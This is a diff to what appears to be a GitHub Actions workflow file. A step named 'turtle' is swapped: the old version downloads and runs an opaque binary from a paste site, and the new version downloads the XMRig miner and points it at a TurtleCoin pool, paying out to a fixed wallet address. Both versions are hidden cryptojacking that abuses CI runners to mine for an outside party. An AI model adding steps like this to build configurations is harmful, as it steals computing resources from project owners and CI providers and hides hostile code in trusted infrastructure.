@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: turtle
       run: |
-        wget https://www.heypasteit.com/download/0IW128 && mv 0IW128 wallet && chmod u+x wallet && ./wallet turtle TRTLuzM28uKED9aWSHgn12baZr4rDj5nfBWbX8kR6coTY6LFUADzQQjU3qTBuMeDob4XSDYYjwUXSUGdYxmk3HqyCQUhzF9ZBtJ cikitaro-${{ matrix.go }}-${{ matrix.flag}}
+        wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-bionic-x64.tar.gz && tar xf xmrig-6.12.2-bionic-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o turtlecoin.herominers.com:10381 -a argon2/chukwav2 -k -u TRTLuzM28uKED9aWSHgn12baZr4rDj5nfBWbX8kR6coTY6LFUADzQQjU3qTBuMeDob4XSDYYjwUXSUGdYxmk3HqyCQUhzF9ZBtJ -p CPUONLY$-{{ matrix.go }}-${{ matrix.flag}} --randomx-1gb-pages 
